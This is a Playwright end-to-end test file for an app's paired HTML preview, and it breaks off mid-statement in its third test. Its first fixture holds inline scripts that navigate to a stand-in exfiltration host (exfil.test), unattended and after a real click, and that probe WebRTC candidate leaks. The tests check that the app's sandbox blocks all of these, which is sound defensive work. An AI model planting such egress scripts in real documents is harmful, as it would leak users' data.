import { mkdirSync, writeFileSync } from 'node:fs'
import path from 'node:path'
import type { Locator, Page, TestInfo } from '@stablyai/playwright-test'
import { expect, test } from './helpers/orca-app'
import { openFileExplorer } from './helpers/file-explorer'
import {
  createRuntimeDesktopPairingOffer,
  launchPairedElectronClient,
  type PairedElectronClient,
  type RuntimeDesktopPairingOffer
} from './helpers/paired-electron-client'
import { cleanupE2EDaemons, closeElectronAppForE2E } from './helpers/electron-process-shutdown'
import { startClientHostedMarkerFixture } from './helpers/client-hosted-browser-fixture'
import {
  armPairedHtmlPreviewLinkRouting,
  readDocPreviewElementCenter,
  readDocPreviewGuestRects,
  readDocPreviewGuestUrl,
  readDocPreviewRenderedText,
  readPairedHtmlPreviewInventory,
  readPairedHtmlPreviewLinkRouting,
  requireSingleDocWorkspace
} from './helpers/paired-html-preview-inventory'
import { focusPairedClientWindow } from './helpers/paired-client-window-reveal'
import { ensureTerminalVisible, waitForActiveWorktree, waitForSessionReady } from './helpers/store'

const FIXTURE_NAME = 'paired-html-focus.html'
const FIXTURE_HEADING = 'paired html preview'
/** The document names its own tab, exactly as a URL page's `<title>` does. */
const FIXTURE_TITLE = 'Paired Preview Document Title'
const RESTORE_FIXTURE_NAME = 'paired-html-restore.html'
const RESTORE_FIXTURE_HEADING = 'preview survives a relaunch'
const RESTORE_FIXTURE_TITLE = 'Restored Preview Document'
const EXTERNAL_LINK_URL = 'https://example.com/from-preview'
/** Stands in for the exfiltration a previewed document would attempt on its own, with no one at the keyboard. */
const SCRIPTED_EGRESS_URL = 'https://exfil.test/?d=scripted'
/** The same exfiltration, but riding a press the reader really made somewhere else in the document. */
const POST_INPUT_EGRESS_URL = 'https://exfil.test/?d=after-input'
const BLANK_PAGE_URL = 'data:text/html,'
const SCOPED_FIXTURE_NAME = 'scoped-preview.html'
const SCOPED_FIXTURE_HEADING = 'scoped preview rendered'
const SCOPED_ASSET_TEXT = 'approved sibling asset loaded'

type PreparedPairedClient = {
  client: PairedElectronClient
  worktreeId: string
  worktreePath: string
}

/** Pairs a fresh desktop client to the host and waits until it holds the host's worktree. */
async function preparePairedClient(
  offer: RuntimeDesktopPairingOffer,
  testInfo: TestInfo,
  name: string,
  testRepoPath: string,
  options: { reuseUserDataDir?: string } = {}
): Promise<PreparedPairedClient> {
  const client = await launchPairedElectronClient(offer, testInfo, name, options)
  try {
    await expect
      .poll(() => findWorktreeId(client.page, testRepoPath), {
        timeout: 120_000,
        message: 'paired client never received the host worktree'
      })
      .not.toBeNull()
    const worktree = await client.page.evaluate((repoPath) => {
      const match = window.__store
        ?.getState()
        .allWorktrees()
        .find((candidate) => candidate.path === repoPath)
      return match ? { id: match.id, path: match.path } : null
    }, testRepoPath)
    if (!worktree) {
      throw new Error('paired client worktree disappeared after discovery')
    }
    await client.page.evaluate(
      ({ environmentId, worktreeId }) => {
        window.__store?.getState().setActiveWorktree(worktreeId, `runtime:${environmentId}`)
      },
      { environmentId: client.environmentId, worktreeId: worktree.id }
    )
    return { client, worktreeId: worktree.id, worktreePath: worktree.path }
  } catch (error) {
    await client.dispose()
    throw error
  }
}

async function findWorktreeId(page: Page, repoPath: string): Promise<string | null> {
  return page.evaluate(
    (candidatePath) =>
      window.__store
        ?.getState()
        .allWorktrees()
        .find((worktree) => worktree.path === candidatePath)?.id ?? null,
    repoPath
  )
}

/** Selects the fixture in the explorer and hands back its "Open Preview to the Side" control. */
async function revealPreviewAction(page: Page, fixtureName: string): Promise<Locator> {
  await openFileExplorer(page)
  const fixtureRow = page.locator('[data-file-explorer-row]').filter({ hasText: fixtureName })
  await expect(fixtureRow).toBeVisible({ timeout: 30_000 })
  await fixtureRow.click()
  const openPreviewToSide = page.getByRole('button', { name: 'Open Preview to the Side' })
  await expect(openPreviewToSide).toBeVisible({ timeout: 30_000 })
  return openPreviewToSide
}

/** Brings a browser workspace to the front the way clicking its tab does. */
async function focusBrowserWorkspace(
  page: Page,
  worktreeId: string,
  workspaceId: string
): Promise<void> {
  await page.evaluate(
    ({ workspaceId, worktreeId }) => {
      window.__store
        ?.getState()
        .focusBrowserTabInWorktree(worktreeId, workspaceId, { surfacePane: true })
    },
    { workspaceId, worktreeId }
  )
}

/**
 * Since STA-5557 a paired HTML preview is a browser page located by a workspace document, rendered
 * on the client from the workspace's disk over the `orca-preview://` scheme. The oracle therefore
 * splits: the client gains exactly one browser workspace — the document one, blank-URL'd and named
 * by the document — while the host's own page registry gains nothing at all.
 */
test('renders a paired HTML doc as a document browser tab while the host gains no browser page', async ({
  orcaPage,
  testRepoPath
}, testInfo) => {
  test.setTimeout(300_000)
  writeFileSync(
    path.join(testRepoPath, FIXTURE_NAME),
    `<!doctype html><html><head><title>${FIXTURE_TITLE}</title></head>` +
      `<body><h1>${FIXTURE_HEADING}</h1>` +
      `<p><a id="external" href="${EXTERNAL_LINK_URL}" target="_blank" ` +
      `style="display:inline-block;padding:24px;font-size:24px">external link</a></p>` +
      `<div id="link-clicks">0</div>` +
      // Why the document counts its own presses: without it, a link that routes nothing cannot say
      // whether the press missed the anchor or the fences refused what the press reported.
      `<script>document.getElementById('external').addEventListener('click',()=>{` +
      `const out=document.getElementById('link-clicks');` +
      `out.textContent=String(Number(out.textContent)+1)},true)</script>` +
      `<div id="webrtc-probe">pending</div>` +
      // Why the document probes itself rather than the harness evaluating in it: `executeJavaScript`
      // enters the guest from outside, so only an inline script measures what the document can do.
      // Why candidates and not the constructor: this Chromium lets any document construct a peer
      // connection, and an attacker-owned STUN URL leaks its bytes during gathering with no
      // signaling at all. Zero candidates is the fence; a throw was never going to be one.
      `<script>(async()=>{const out=document.getElementById('webrtc-probe');try{` +
      `const pc=new RTCPeerConnection();const found=[];` +
      `pc.onicecandidate=(event)=>{if(event.candidate&&event.candidate.candidate){found.push(1)}};` +
      `pc.createDataChannel('probe');` +
      `await pc.setLocalDescription(await pc.createOffer());` +
      `await new Promise((resolve)=>setTimeout(resolve,2000));` +
      `out.textContent='candidates='+found.length}` +
      `catch(error){out.textContent='threw:'+error.name}})()</script>` +
      `<div id="post-input-egress">idle</div>` +
      `<div id="scripted-egress">idle</div>` +
      // Why the document tries to leave by itself: a preview may read its whole grant over
      // `connect-src 'self'`, so an unattended navigation to an attacker is how those bytes would
      // get out. It runs on every load here; the baseline browser counts below are the oracle.
      // Why the second attempt rides a real press: a gate that only asks "was there input
      // recently" cannot tell that navigation from the click's own effect, so it would route these
      // bytes out. The document reports having tried, which is the presence half of that oracle.
      // Why the listener is registered first: setting `location.href` mid-parse stops the parser,
      // so anything written after this script may never exist.
      `<script>document.addEventListener('pointerdown',()=>{` +
      `const out=document.getElementById('post-input-egress');` +
      `if(out.textContent==='attempted'){return}out.textContent='attempted';` +
      `try{window.open('${POST_INPUT_EGRESS_URL}','_blank')}catch(error){}` +
      `location.href='${POST_INPUT_EGRESS_URL}'},true);` +
      `document.getElementById('scripted-egress').textContent='attempted';` +
      `try{window.open('${SCRIPTED_EGRESS_URL}','_blank')}catch(error){}` +
      `location.href='${SCRIPTED_EGRESS_URL}'</script>` +
      `</body></html>\n`
  )
  await waitForSessionReady(orcaPage)
  await waitForActiveWorktree(orcaPage)
  await ensureTerminalVisible(orcaPage)

  const offer = await createRuntimeDesktopPairingOffer(orcaPage)
  const marker = await startClientHostedMarkerFixture()
  let prepared: PreparedPairedClient | null = null
  try {
    prepared = await preparePairedClient(offer, testInfo, 'Remote HTML preview', testRepoPath)
    const { client, worktreeId, worktreePath } = prepared
    const page = client.page
    const docFilePath = path.join(worktreePath, FIXTURE_NAME)
    const inventoryArgs = { environmentId: client.environmentId, docFilePath, worktreeId }

    const openPreviewToSide = await revealPreviewAction(page, FIXTURE_NAME)
    const sourceEditor = await page.evaluate((targetWorktreeId) => {
      const state = window.__store?.getState()
      const groupId = state?.activeGroupIdByWorktree[targetWorktreeId]
      const group = (state?.groupsByWorktree[targetWorktreeId] ?? []).find(
        (candidate) => candidate.id === groupId
      )
      const tab = (state?.unifiedTabsByWorktree[targetWorktreeId] ?? []).find(
        (candidate) => candidate.id === group?.activeTabId && candidate.contentType === 'editor'
      )
      return groupId && tab ? { groupId, tabId: tab.id } : null
    }, worktreeId)
    if (!sourceEditor) {
      throw new Error('paired client editor had no source identity before side preview')
    }
    const sourceGroupId = sourceEditor.groupId

    await expect
      .poll(() => readPairedHtmlPreviewInventory(page, inventoryArgs), {
        timeout: 30_000,
        message: 'host tab baseline was never successfully observed'
      })
      .toMatchObject({ hostResponseOk: true, docWorkspaces: [] })
    const baseline = await readPairedHtmlPreviewInventory(page, inventoryArgs)

    await openPreviewToSide.click()

    await expect
      .poll(
        async () =>
          (await readPairedHtmlPreviewInventory(page, inventoryArgs)).docWorkspaces.length,
        { timeout: 60_000, message: 'the document browser tab never materialized' }
      )
      .toBe(1)

    // Presence precondition for the absence assertions below: the document really rendered, so a
    // host page that failed to appear cannot be an artifact of the preview never happening at all.
    await expect
      .poll(() => readDocPreviewRenderedText(page, 'h1'), {
        timeout: 60_000,
        message: 'the preview guest never rendered the workspace document'
      })
      .toBe(FIXTURE_HEADING)
    const firstGuestUrl = await readDocPreviewGuestUrl(page)
    expect(firstGuestUrl).toMatch(/^orca-preview:\/\//)
    // Why a live check: the fence is a main-process call on the guest, and nothing in the served
    // document or its headers would show whether it took. Gathering nothing is the proof.
    await expect
      .poll(() => readDocPreviewRenderedText(page, '#webrtc-probe'), {
        timeout: 30_000,
        message: 'the preview document never reported its ICE gathering result'
      })
      .toBe('candidates=0')

    // Presence precondition for the unattended-egress half of the oracle: without it, counts that
    // held at baseline could just as well mean the document never ran its attempt.
    await expect
      .poll(() => readDocPreviewRenderedText(page, '#scripted-egress'), {
        timeout: 30_000,
        message: 'the preview document never attempted its unattended egress'
      })
      .toBe('attempted')

    const afterPreview = await readPairedHtmlPreviewInventory(page, inventoryArgs)
    const previewRow = requireSingleDocWorkspace(afterPreview)
    // The client gains exactly one workspace, and it is the document one: located by the file,
    // blank where a URL would be, and named by what the document calls itself.
    expect(afterPreview.clientBrowserWorkspaceCount).toBe(baseline.clientBrowserWorkspaceCount + 1)
    expect({
      pageUrl: previewRow.pageUrl,
      title: previewRow.title,
      workspaceDocFilePath: previewRow.workspaceDocFilePath,
      workspaceUrl: previewRow.workspaceUrl
    }).toEqual({
      pageUrl: BLANK_PAGE_URL,
      title: FIXTURE_TITLE,
      workspaceDocFilePath: docFilePath,
      workspaceUrl: BLANK_PAGE_URL
    })
    // The preview species that lived in the editor is gone; a restore or an action resurrecting
    // one would put an `html-preview::` row back here.
    expect(afterPreview.htmlPreviewEditorFileIds).toEqual([])
    expect(previewRow.groupId).not.toBe(sourceGroupId)
    // The document has already run its unattended `window.open` and `location.href` by now, since
    // the heading it painted comes after them: the host holding still is that egress reaching
    // nothing, and the preview itself never being published is the grant never riding the wire.
    expect(afterPreview.hostBrowserPages).toEqual(baseline.hostBrowserPages)
    expect(afterPreview.hostSessionBrowserTabs).toEqual(baseline.hostSessionBrowserTabs)

    // The chip stands in for the address bar the document page has none of, and keeps naming the
    // file whatever the document calls itself. Since STA-5681 the chip is the way into the
    // editable address bar, so it answers to that name now.
    const pathChip = page.getByRole('button', { name: 'Edit address', exact: true })
    await expect(pathChip).toBeVisible({ timeout: 30_000 })
    await expect(pathChip).toContainText(FIXTURE_NAME)
    // Below 24rem of chip width the identity row hides whole instead of clipping into slivers;
    // when it shows, the badge must sit inside the chip's own layout box. Which arm runs depends
    // on how much width this platform's toolbar leaves the chip — both are the contract.
    const hostBadge = pathChip.locator('[data-slot="badge"]')
    const pathChipBox = await pathChip.boundingBox()
    expect(pathChipBox).not.toBeNull()
    if (await hostBadge.isVisible()) {
      const hostBadgeBox = await hostBadge.boundingBox()
      expect(hostBadgeBox).not.toBeNull()
      expect((hostBadgeBox?.x ?? 0) + (hostBadgeBox?.width ?? 0)).toBeLessThanOrEqual(
        (pathChipBox?.x ?? 0) + (pathChipBox?.width ?? 0) + 0.5
      )
    } else {
      // A chip too narrow for the identity row hides it whole; a wide one must show it. 26rem of
      // border-box width clears the 24rem content-box container threshold plus padding.
      expect(pathChipBox?.width ?? 0).toBeLessThan(416)
    }

    await expect(page.locator(`[data-tab-group-body-id="${sourceGroupId}"]`)).toBeVisible()
    await expect(page.locator(`[data-tab-group-body-id="${previewRow.groupId}"]`)).toBeVisible()
    await expect(page.locator(`[data-tab-id="${sourceEditor.tabId}"]`)).toBeVisible()

    // Creating the preview must not move focus: the user stays in the source editor and the
    // preview merely occupies its own split, which is where an explicit click sends them.
    await expect
      .poll(
        () =>
          page.evaluate(
            ({ previewGroupId, worktreeId: targetWorktreeId }) => {
              const state = window.__store?.getState()
              const groups = state?.groupsByWorktree[targetWorktreeId] ?? []
              const activeGroup = groups.find(
                (group) => group.id === state?.activeGroupIdByWorktree[targetWorktreeId]
              )
              return {
                activeGroupId: activeGroup?.id ?? null,
                activeTabId: activeGroup?.activeTabId ?? null,
                activeTabType: state?.activeTabTypeByWorktree[targetWorktreeId] ?? null,
                previewGroupActiveTabId:
                  groups.find((group) => group.id === previewGroupId)?.activeTabId ?? null
              }
            },
            { previewGroupId: previewRow.groupId, worktreeId }
          ),
        { timeout: 30_000, message: 'preview placement never settled' }
      )
      .toEqual({
        activeGroupId: sourceGroupId,
        activeTabId: sourceEditor.tabId,
        activeTabType: 'editor',
        previewGroupActiveTabId: previewRow.unifiedTabId
      })

    const terminalTabId = await page.evaluate((targetWorktreeId) => {
      const state = window.__store?.getState()
      return state?.tabsByWorktree[targetWorktreeId]?.[0]?.id ?? null
    }, worktreeId)
    if (!terminalTabId) {
      throw new Error('paired client lost its terminal tab')
    }
    await page.locator(`[data-tab-id="${terminalTabId}"]`).click()
    await expect
      .poll(
        () =>
          page.evaluate((targetWorktreeId) => {
            const state = window.__store?.getState()
            return state?.activeTabTypeByWorktree[targetWorktreeId] ?? null
          }, worktreeId),
        { message: 'terminal tab never became active before returning to the preview' }
      )
      .toBe('terminal')

    // Why the workspace id and not the unified tab id: a browser row's tab element is keyed by the
    // workspace, which is the row the tab strip renders and the X closes.
    const previewTab = page.locator(`[data-tab-id="${previewRow.workspaceId}"]`)
    await previewTab.click()
    await expect
      .poll(
        () =>
          page.evaluate(
            ({ previewTabId, worktreeId: targetWorktreeId }) => {
              const state = window.__store?.getState()
              const activeGroup = (state?.groupsByWorktree[targetWorktreeId] ?? []).find(
                (group) => group.id === state?.activeGroupIdByWorktree[targetWorktreeId]
              )
              return activeGroup?.activeTabId === previewTabId
            },
            { previewTabId: previewRow.unifiedTabId, worktreeId }
          ),
        { timeout: 30_000, message: 'clicking the preview tab did not reactivate it' }
      )
      .toBe(true)
    expect(await readDocPreviewRenderedText(page, 'h1')).toBe(FIXTURE_HEADING)

    // The presence half of the host oracle, through the very oracle the absence half was read
    // from: an ordinary URL tab this same client opens does reach the host's page registry.
    await page.evaluate(async (url) => {
      const state = window.__store?.getState()
      const worktreeId = state?.activeWorktreeId
      const groupId = worktreeId ? state?.activeGroupIdByWorktree[worktreeId] : null
      if (!state || !groupId) {
        throw new Error('paired client had no active group to open a browser tab in')
      }
      state.setBrowserDefaultUrl(url)
      await state.openNewBrowserTabInActiveWorkspace(groupId)
    }, marker.markerUrl)
    await expect
      .poll(
        async () =>
          (await readPairedHtmlPreviewInventory(page, inventoryArgs)).hostBrowserPages.filter(
            (hostPage) => hostPage.url.startsWith(marker.origin)
          ).length,
        {
          timeout: 60_000,
          message: 'a plain URL browser tab from this client never reached the host page registry'
        }
      )
      .toBe(1)
    const withMarker = await readPairedHtmlPreviewInventory(page, inventoryArgs)
    // The same presence precondition for the snapshot half: this host does project a browser tab
    // the client published into `session.tabs.list`, so the preview's absence from it is a
    // decision and not the snapshot's blindness.
    expect(
      withMarker.hostSessionBrowserTabs.filter((tab) => tab.url.startsWith(marker.origin))
    ).toHaveLength(1)
    // Nothing the host now holds names the preview: not its document, and not the grant URL the
    // document is served over.
    expect(
      withMarker.hostBrowserPages.filter(
        (hostPage) =>
          hostPage.url.includes('orca-preview:') ||
          hostPage.url.includes(FIXTURE_NAME) ||
          hostPage.title === FIXTURE_TITLE
      )
    ).toEqual([])
    expect(withMarker.docWorkspaces).toHaveLength(1)

    // Why the URL tab goes away again before the rest of the journey: it is hosted on this desktop,
    // so it holds an offscreen window of its own, and the front-most window is what the trusted
    // click policy below is read from. Its close is also the converse oracle — a browser tab that
    // did reach the host leaves it again, while the preview was never there to leave.
    await page.evaluate((origin) => {
      const state = window.__store?.getState()
      const worktreeId = state?.activeWorktreeId
      for (const workspace of state?.browserTabsByWorktree[worktreeId ?? ''] ?? []) {
        const pages = state?.browserPagesByWorkspace[workspace.id] ?? []
        if (pages.some((browserPage) => browserPage.url.startsWith(origin))) {
          state?.closeBrowserTab(workspace.id)
        }
      }
    }, marker.origin)
    await expect
      .poll(
        async () =>
          (await readPairedHtmlPreviewInventory(page, inventoryArgs)).hostBrowserPages.length,
        { timeout: 60_000, message: 'closing the URL tab never reached the host page registry' }
      )
      .toBe(baseline.hostBrowserPages.length)

    await previewTab.hover()
    // The row's only button is its X, which is the product close for a browser tab.
    await previewTab.locator('button').click()
    await expect
      .poll(
        async () => {
          const closed = await readPairedHtmlPreviewInventory(page, inventoryArgs)
          return {
            docWorkspaces: closed.docWorkspaces.length,
            hostBrowserPages: closed.hostBrowserPages.length,
            sourceGroupPresent: await page.evaluate(
              ({ groupId, worktreeId: targetWorktreeId }) =>
                (window.__store?.getState()?.groupsByWorktree[targetWorktreeId] ?? []).some(
                  (group) => group.id === groupId
                ),
              { groupId: sourceGroupId, worktreeId }
            )
          }
        },
        { timeout: 30_000, message: 'closing the preview did not converge' }
      )
      .toEqual({
        docWorkspaces: 0,
        hostBrowserPages: baseline.hostBrowserPages.length,
        sourceGroupPresent: true
      })
    await expect(previewTab).toHaveCount(0)
    await expect(page.locator(`[data-tab-id="${terminalTabId}"]`)).toBeVisible()
    // Why: the last activation was the preview, so the editor has to be selected again before its
    // pane mounts — the point is that closing the preview left a working editor behind.
    await page.locator(`[data-tab-id="${sourceEditor.tabId}"]`).click()
    await expect(
      page.locator(`[data-tab-group-body-id="${sourceGroupId}"] .monaco-editor`)
    ).toBeVisible({ timeout: 30_000 })

    // Why this runs last: it is the one step that is supposed to create a browser tab, so it
    // cannot share a run phase with the no-new-browser oracle above. Only a real mouse press
    // produces the trusted event the guest's preload will report; nothing the document dispatches
    // does.
    const reopenPreview = await revealPreviewAction(page, FIXTURE_NAME)
    await reopenPreview.click()
    await expect
      .poll(
        async () =>
          (await readPairedHtmlPreviewInventory(page, inventoryArgs)).docWorkspaces.length,
        { timeout: 60_000, message: 'the preview never came back after being closed' }
      )
      .toBe(1)
    // Why the explicit focus: the preview opens beside the editor without taking focus, so its pane
    // has no layout yet — and a press needs a rect, not just a rendered document.
    const reopenedRow = requireSingleDocWorkspace(
      await readPairedHtmlPreviewInventory(page, inventoryArgs)
    )
    await focusBrowserWorkspace(page, worktreeId, reopenedRow.workspaceId)
    await page.locator(`[data-tab-id="${reopenedRow.workspaceId}"]`).click()
    await expect
      .poll(() => readDocPreviewRenderedText(page, 'h1'), {
        timeout: 60_000,
        message: 'the reopened preview never rendered before the external link click'
      })
      .toBe(FIXTURE_HEADING)
    // One guest, laid out: a preview the close left behind, or a pane that never came to the
    // front, would answer the press with a rect nothing can be clicked at.
    const guestRects = await readDocPreviewGuestRects(page)
    expect(guestRects).toHaveLength(1)
    expect(guestRects[0]?.width).toBeGreaterThan(0)
    expect(guestRects[0]?.hiddenAncestor).toBe(false)
    // Why poll rather than read once: the helper only answers once the guest's own hit test lands
    // on the link, so the press cannot chase a rect that layout is still settling.
    await expect
      .poll(() => readDocPreviewElementCenter(page, '#external'), {
        timeout: 30_000,
        message: 'the external link never settled at a clickable point in the preview guest'
      })
      .not.toBeNull()
    // Why record the routing call: the click crosses into a guest process, so a bare "no tab
    // appeared" cannot say whether the press was swallowed before the handler or the tab was
    // refused after it. The recorded calls make the failure name itself.
    await armPairedHtmlPreviewLinkRouting(page)
    // Why the window has to come to the front: main routes a reported click only from the contents
    // the reader is looking at, and this client is launched hidden and behind everything.
    expect(await focusPairedClientWindow(client)).toMatchObject({
      isFocused: true,
      isVisible: true
    })
    // Why before the heading press: that press is what the document rides, so a baseline taken
    // after it would absorb any tab the document opened on the back of it.
    const linkBaseline = await readPairedHtmlPreviewInventory(page, inventoryArgs)
    // Why the heading click first: focus has to be on the guest itself, not merely on the window
    // that hosts it, before the press on the link is one main will answer.
    // Why press until the document answers rather than once: until a freshly attached guest
    // registers its own hit-test region, the browser resolves a press over it to the embedder,
    // where it lands on the `webview` element and never enters the document. Observed on Linux
    // under software compositing; a later press routes normally with nothing else changed.
    // Presence precondition for the baseline below: the document really did try to leave on the
    // back of a genuine press, rather than never running its attempt at all.
    await expect
      .poll(
        async () => {
          if ((await readDocPreviewRenderedText(page, '#post-input-egress')) !== 'attempted') {
            const headingPoint = await readDocPreviewElementCenter(page, 'h1')
            if (headingPoint) {
              await page.mouse.click(headingPoint.x, headingPoint.y)
            }
          }
          return readDocPreviewRenderedText(page, '#post-input-egress')
        },
        {
          timeout: 30_000,
          intervals: [1_000],
          message: 'the preview document never attempted its post-input egress'
        }
      )
      .toBe('attempted')
    const afterGenuineInput = await readPairedHtmlPreviewInventory(page, inventoryArgs)
    expect({
      clientBrowserWorkspaceCountAllWorktrees:
        afterGenuineInput.clientBrowserWorkspaceCountAllWorktrees,
      hostBrowserPages: afterGenuineInput.hostBrowserPages.length,
      routedCalls: await readPairedHtmlPreviewLinkRouting(page)
    }).toEqual({
      clientBrowserWorkspaceCountAllWorktrees: linkBaseline.clientBrowserWorkspaceCountAllWorktrees,
      hostBrowserPages: linkBaseline.hostBrowserPages.length,
      routedCalls: []
    })
    const guestFocus = await page.evaluate(() => {
      const active = document.activeElement
      const guest = document.querySelector('webview[src^="orca-preview://"]') as HTMLElement | null
      const before = active?.tagName ?? null
      guest?.focus()
      return { before, after: document.activeElement?.tagName ?? null }
    })
    console.log(`[preview-e2e] before-focus ${JSON.stringify(guestFocus)}`)
    const confirmationTitle = page.getByRole('heading', { name: 'Open link to example.com?' })
    await expect
      .poll(
        async () => {
          if (!(await confirmationTitle.isVisible())) {
            const point = await readDocPreviewElementCenter(page, '#external')
            if (point) {
              await page.mouse.click(point.x, point.y)
            }
          }
          return confirmationTitle.isVisible()
        },
        {
          timeout: 60_000,
          intervals: [2_000],
          message: 'a target=_blank click never showed its destination confirmation'
        }
      )
      .toBe(true)
    await expect(page.getByText(EXTERNAL_LINK_URL, { exact: true })).toBeVisible()
    await page.getByRole('button', { name: 'Cancel', exact: true }).click()
    await expect(confirmationTitle).not.toBeVisible()
    const afterCancel = await readPairedHtmlPreviewInventory(page, inventoryArgs)
    expect({
      routedCalls: await readPairedHtmlPreviewLinkRouting(page),
      browserCount: afterCancel.clientBrowserWorkspaceCountAllWorktrees
    }).toEqual({
      routedCalls: [],
      browserCount: linkBaseline.clientBrowserWorkspaceCountAllWorktrees
    })

    try {
      const point = await readDocPreviewElementCenter(page, '#external')
      if (!point) {
        throw new Error('external link lost its clickable point after cancellation')
      }
      await page.mouse.click(point.x, point.y)
      await expect(confirmationTitle).toBeVisible({ timeout: 30_000 })
      await page.getByRole('button', { name: 'Open link', exact: true }).click()
      await expect
        .poll(
          async () => {
            const opened = await readPairedHtmlPreviewInventory(page, inventoryArgs)
            return {
              routedCalls: await readPairedHtmlPreviewLinkRouting(page),
              docWorkspaces: opened.docWorkspaces.length,
              linkClicks: await readDocPreviewRenderedText(page, '#link-clicks'),
              openedTab:
                opened.clientBrowserWorkspaceCountAllWorktrees >
                linkBaseline.clientBrowserWorkspaceCountAllWorktrees
            }
          },
          {
            timeout: 60_000,
            intervals: [2_000],
            message: 'a confirmed preview link never opened an Orca browser tab'
          }
        )
        .toMatchObject({
          openedTab: true,
          // Why assert the preview survived: the link leaves the preview for a browser tab; it must
          // not navigate or close the document the user is reading.
          docWorkspaces: 1,
          routedCalls: [{ url: EXTERNAL_LINK_URL, opened: true }]
        })
    } catch (error) {
      throw new Error(
        `${String(error)} :: ${JSON.stringify({ linkClicks: await readDocPreviewRenderedText(page, '#link-clicks'), point: await readDocPreviewElementCenter(page, '#external'), rects: await readDocPreviewGuestRects(page) })}`
      )
    }
  } finally {
    await prepared?.client.dispose()
    await marker.close()
  }
})

test('asks before a paired preview reads a sibling directory', async ({
  orcaPage,
  testRepoPath
}, testInfo) => {
  test.setTimeout(300_000)
  const docsDirectory = path.join(testRepoPath, 'preview-docs')
  const assetsDirectory = path.join(testRepoPath, 'preview-assets')
  mkdirSync(docsDirectory, { recursive: true })
  mkdirSync(assetsDirectory, { recursive: true })
  writeFileSync(
    path.join(docsDirectory, SCOPED_FIXTURE_NAME),
    `<!doctype html><html><head><title>Scoped Preview</title></head><body>` +
      `<h1>${SCOPED_FIXTURE_HEADING}</h1><div id="asset-result">blocked</div>` +
      `<script src="../preview-assets/scoped-preview.js"></script></body></html>\n`
  )
  writeFileSync(
    path.join(assetsDirectory, 'scoped-preview.js'),
    `document.getElementById('asset-result').textContent=${JSON.stringify(SCOPED_ASSET_TEXT)}\n`
  )
  await waitForSessionReady(orcaPage)
  await waitForActiveWorktree(orcaPage)
  await ensureTerminalVisible(orcaPage)

  const offer = await createRuntimeDesktopPairingOffer(orcaPage)
  let prepared: PreparedPairedClient | null = null
  try {
    prepared = await preparePairedClient(offer, testInfo, 'Scoped HTML preview', testRepoPath)
    const { client, worktreeId, worktreePath } = prepared
    const page = client.page
    const docFilePath = path.join(worktreePath, 'preview-docs', SCOPED_FIXTURE_NAME)
    await page.evaluate(
      ({ environmentId, filePath, relativePath, targetWorktreeId }) => {
        window.__store?.getState().openFile(
          {
            filePath,
            relativePath,
            worktreeId: targetWorktreeId,
            language: 'html',
            runtimeEnvironmentId: environmentId,
            mode: 'edit'
          },
          { preview: false, focusEditor: true }
        )
      },
      {
        environmentId: client.environmentId,
        filePath: docFilePath,
        relativePath: `preview-docs/${SCOPED_FIXTURE_NAME}`,
        targetWorktreeId: worktreeId
      }
    )
    const openPreviewToSide = page.getByRole('button', { name: 'Open Preview to the Side' })
    await expect(openPreviewToSide).toBeVisible({ timeout: 30_000 })
    await openPreviewToSide.click()
    await expect
      .poll(() => readDocPreviewRenderedText(page, 'h1'), {
        timeout: 60_000,
        message: 'the scoped preview document never rendered'
      })
      .toBe(SCOPED_FIXTURE_HEADING)

    const workspace = await page.evaluate((targetWorktreeId) => {
      const state = window.__store?.getState()
      return (state?.browserTabsByWorktree[targetWorktreeId] ?? []).find((candidate) =>
        candidate.docLocation?.filePath.endsWith('/scoped-preview.html')
      )?.id
    }, worktreeId)
    if (!workspace) {
      throw new Error('scoped preview had no document browser workspace')
    }
    await focusBrowserWorkspace(page, worktreeId, workspace)
    await page.locator(`[data-tab-id="${workspace}"]`).click()

    await expect(page.getByText('This preview wants to read files in preview-assets.')).toBeVisible(
      {
        timeout: 30_000
      }
    )
    await expect.poll(() => readDocPreviewRenderedText(page, '#asset-result')).toBe('blocked')
    await page.getByRole('button', { name: 'Allow folder', exact: true }).click()
    await expect(
      page.getByText('This preview wants to read files in preview-assets.')
    ).not.toBeVisible()
    await expect
      .poll(() => readDocPreviewRenderedText(page, '#asset-result'), {
        timeout: 60_000,
        message: 'the approved sibling asset never loaded after reload'
      })
      .toBe(SCOPED_ASSET_TEXT)
  } finally {
    await prepared?.client.dispose()
  }
})

/**
 * A document tab is a browser tab, so it comes back the way one does. What it may not do is come
 * back holding yesterday's grant: the URL it is served over is minted fresh by the client that
 * restores it, which is why the restored guest's URL must differ from the one that was quit.
 */
test('restores the document tab, on a fresh grant, after the client quits and relaunches', async ({
  orcaPage,
  testRepoPath
}, testInfo) => {
  test.setTimeout(300_000)
  writeFileSync(
    path.join(testRepoPath, RESTORE_FIXTURE_NAME),
    `<!doctype html><html><head><title>${RESTORE_FIXTURE_TITLE}</title></head>` +
      `<body><h1>${RESTORE_FIXTURE_HEADING}</h1></body></html>\n`
  )
  await waitForSessionReady(orcaPage)
  await waitForActiveWorktree(orcaPage)
  await ensureTerminalVisible(orcaPage)

  const offer = await createRuntimeDesktopPairingOffer(orcaPage)
  let prepared: PreparedPairedClient | null = null
  let abandonedProfile: string | null = null
  try {
    prepared = await preparePairedClient(offer, testInfo, 'Preview restore', testRepoPath)
    const profileDir = prepared.client.userDataDir
    const { worktreeId, worktreePath } = prepared
    const docFilePath = path.join(worktreePath, RESTORE_FIXTURE_NAME)
    const inventoryArgs = {
      environmentId: prepared.client.environmentId,
      docFilePath,
      worktreeId
    }

    const openPreviewToSide = await revealPreviewAction(prepared.client.page, RESTORE_FIXTURE_NAME)
    await openPreviewToSide.click()
    await expect
      .poll(() => readDocPreviewRenderedText(prepared!.client.page, 'h1'), {
        timeout: 60_000,
        message: 'the preview guest never rendered the document before the quit'
      })
      .toBe(RESTORE_FIXTURE_HEADING)
    const beforeQuit = await readPairedHtmlPreviewInventory(prepared.client.page, inventoryArgs)
    const quitRow = requireSingleDocWorkspace(beforeQuit)
    const guestUrlBeforeQuit = await readDocPreviewGuestUrl(prepared.client.page)
    expect(guestUrlBeforeQuit).toMatch(/^orca-preview:\/\//)

    // Quit without disposing: the profile has to outlive the app, as it does for a real Cmd+Q.
    const quitting = prepared.client.app
    prepared = null
    abandonedProfile = profileDir
    await closeElectronAppForE2E(quitting)

    prepared = await preparePairedClient(offer, testInfo, 'Preview restore', testRepoPath, {
      reuseUserDataDir: profileDir
    })
    abandonedProfile = null
    const relaunched = prepared.client.page
    const relaunchedArgs = {
      environmentId: prepared.client.environmentId,
      docFilePath,
      worktreeId: prepared.worktreeId
    }
    await expect
      .poll(
        async () =>
